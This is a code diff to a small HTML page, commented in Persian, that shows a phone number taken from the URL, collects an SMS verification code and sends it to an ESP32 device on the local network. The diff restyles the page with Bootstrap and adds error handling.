@@ -2,46 +2,73 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Enter Code</title>
+  <title>Verify Code</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <script>
-    // دریافت شماره تلفن از URL
+    // دریافت شماره از پارامتر URL
     const urlParams = new URLSearchParams(window.location.search);
     const phone = urlParams.get('phone');
+    
+    window.onload = function() {
+      if (phone) {
+        document.getElementById('phone-display').textContent = phone;
+      } else {
+        alert('Phone number missing!');
+        window.location.href = 'index.html';
+      }
+    }
   </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f9fa;
+    }
+    .card {
+      margin-top: 50px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+  </style>
 </head>
 <body>
-  <div class="form-container">
-    <h4>Enter SMS Code</h4>
-    <div class="note">
-      <b>Operator:</b> Send SMS to this number:<br>
-      <span id="phoneDisplay" style="font-weight:bold;font-size:1.2em;"></span>
+  <div class="container mt-5">
+    <div class="row justify-content-center">
+      <div class="col-md-6">
+        <div class="card">
+          <div class="card-body">
+            <h3 class="card-title text-center mb-4">Enter Verification Code</h3>
+            <p class="text-center">We sent a code to: <strong id="phone-display"></strong></p>
+            
+            <form id="codeForm">
+              <div class="mb-3">
+                <input type="text" class="form-control" name="code" placeholder="Enter 6-digit code" required>
+              </div>
+              <button type="submit" class="btn btn-primary w-100">Verify</button>
+            </form>
+          </div>
+        </div>
+      </div>
     </div>
-    <form id="codeForm">
-      <input class="form-control my-3" name="code" placeholder="Enter code" required>
-      <button type="submit" class="btn btn-light w-100">Verify</button>
-    </form>
   </div>
 
   <script>
-    // نمایش شماره تلفن
-    document.getElementById('phoneDisplay').textContent = phone;
-    
-    document.getElementById('codeForm').addEventListener('submit', function(e) {
+    document.getElementById('codeForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       const code = document.querySelector('input[name="code"]').value;
-      const espIP = 'ESP_IP_ADDRESS'; // جایگزین با IP واقعی ESP32
+      const espIP = '192.168.178.237'; // آدرس IP ESP32 خود را وارد کنید
       
-      // ارسال کد به ESP32
-      fetch(`http://${espIP}/submit-code?code=${encodeURIComponent(code)}`)
-        .then(() => {
-          // انتقال به صفحه موفقیت
+      try {
+        const response = await fetch(`http://${espIP}/submit-code?code=${encodeURIComponent(code)}`);
+        
+        if (response.ok) {
           window.location.href = 'success.html';
-        })
-        .catch(error => {
-          console.error('Error:', error);
-          alert('Failed to submit code. Please try again.');
-        });
+        } else {
+          const errorText = await response.text();
+          alert(`Error: ${errorText}`);
+        }
+      } catch (error) {
+        console.error('Fetch error:', error);
+        alert('Failed to connect to ESP32. Check IP address and network connection.');
+      }
     });
   </script>
 </body>
